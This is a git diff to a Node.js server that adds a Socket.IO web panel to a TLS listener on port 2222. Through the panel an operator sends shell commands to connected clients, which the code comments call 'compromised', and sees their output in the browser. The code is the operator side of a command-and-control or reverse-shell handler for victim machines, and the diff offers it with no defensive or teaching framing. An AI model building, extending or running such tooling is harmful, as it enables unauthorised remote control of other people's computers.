@@ -1,12 +1,14 @@
 // Core modules 
 const tls = require('tls')
-var fs = require('fs')
-var path = require('path');
+const fs = require('fs')
+const path = require('path')
+const http = require('http')
 
 // npm modules
 const chalk = require('chalk')
 const express = require('express')
 const hbs = require('hbs')
+const socketio = require('socket.io')
 
 // custom modules
 const prompt = require('./utils/prompt');
@@ -27,6 +29,7 @@ const partialsPath = path.join(__dirname, './templates/partials')
 
 // Blank object to store client socket objects. This variable is pass to "prompt.js"
 let clients = {}
+let ioclients = {}
 
 /**
  * Purpose: to initialize clients connecting and assign unique ID to store in "clients" object
@@ -44,6 +47,12 @@ var server = tls.createServer(options, (client) => {
     // Dump data from any client to console along with their ID
     client.on('data', (data) => {
         console.log(`From Client (${client.connID}):\n ${data.toString()}`)
+
+        ioclients[client.connID].emit('cmdRes', data.toString())
+        /**
+         * SEND RESPONSE FROM COMPROMISED CLIENT TO SOCKET IO CLIENT (WEB) FROM HERE
+         */
+
     })
 
     // When client disconnects, remove it from the "clients" object
@@ -61,6 +70,8 @@ var server = tls.createServer(options, (client) => {
 
 // Express app
 const app = express()
+const httpServer = http.createServer(app)
+const io = socketio(httpServer)
 
 app.set('view engine', 'hbs')
 app.set('views', viewsPath)
@@ -75,8 +86,7 @@ app.get('', (req, res) => {
     Object.keys(clients).forEach((key) => {
         clientList.push(key)
     })
-
-    console.log(clientList)
+    
     // res.send(clientList)
     res.render('index', {
         clientList
@@ -94,6 +104,29 @@ app.get('*', (req,res) => {
 })
 
 /**
+ * Socket IO (WEB SERVER)
+ */
+io.on('connection', (socket) => {
+    console.log('new socketio connection')
+    // recieve from ioclient the tls key and add to ioclients stack
+
+    socket.on('bind', (tlsSockId) => {
+        ioclients[tlsSockId] = socket
+        // console.log(ioclients)
+    })
+
+    socket.on('cmd', (data) => {
+        console.log(`running: ${JSON.stringify(data)}`)
+        client = clients[data.clientId]
+        if (client) {
+            client.write('0' + data.shellInput.substr(0))
+        } else {
+            socket.emit('cmdRes', 'Requested client could not be found')
+        }
+    })
+})
+
+/**
  * listen to incoming tls socket connections and pass by reference to utils/prompt function
  */
 server.listen(2222, () => {
@@ -105,6 +138,6 @@ server.listen(2222, () => {
 /**
  * listen to http server on port 3000
  */
-app.listen(3000, () => {
+httpServer.listen(3000, () => {
     console.log('Webserver is live on port 3000')
 })
